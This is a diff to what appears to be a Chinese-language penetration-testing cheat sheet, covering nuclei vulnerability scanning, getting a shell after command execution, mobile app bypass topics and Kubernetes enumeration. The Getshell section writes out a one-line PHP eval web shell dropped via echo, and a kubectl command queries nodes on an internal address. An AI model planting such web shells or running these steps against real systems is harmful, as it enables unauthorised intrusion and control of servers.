@@ -44,11 +44,20 @@ https://github.com/projectdiscovery/nuclei
 https://github.com/m-sec-org/EZ
 https://github.com/zan8in/afrog
 
-用nuclei进行批量漏洞检测时，如果怀疑是模板问题，可执行nuclei.exe -validate -t template.yaml进行检查
+https://docs.projectdiscovery.io/templates/protocols/http/raw-http-examples
+https://docs.projectdiscovery.io/templates/introduction
+
+用nuclei进行批量漏洞检测时，如果怀疑是模板问题，可执行如下命令检查模板
+nuclei.exe -validate -t template.yaml
+
+默认线程数25
+-c, -concurrency int               maximum number of templates to be executed in parallel (default 25)
 ```
 
 # 04-Getshell
 ```
+https://github.com/swisskyrepo/PayloadsAllTheThings
+
 0x01 拿到命令执行的口子
     01、反弹shell
         1.1 先判断目标是否出网
@@ -62,6 +71,7 @@ https://github.com/zan8in/afrog
         https://tool.chinaz.com/tools/urlencode.aspx
     03、目标不出网时，通过echo写一句话木马
         echo "<?php eval(\$_POST['cmd']);?>">1.php
+        1.php -> <?php eval($_POST['cmd']);?>
 
         在burp及bash下测试发现，执行如下命令
         echo "<?php eval($_POST['cmd']);?>">1.php
@@ -143,7 +153,7 @@ https://github.com/zan8in/afrog
 上面两种方式都无果的话，就掏出你的储备的字典去碰碰运气吧
 ```
 
-# 07-移动端
+# 06-移动端
 ```
 绕过APP强制更新
 绕过Frida反调试
@@ -166,7 +176,7 @@ https://mp.weixin.qq.com/s/v77kfoRcP9Jo7939402Ykg
 https://mp.weixin.qq.com/s/ebZjE_85RLIC5TZQ1JC1og
 ```
 
-# 08-云安全
+# 07-云安全
 ```
 # 获取当前集群下全部node
 .\kubectl -s 172.31.32.36:8089 get nodes
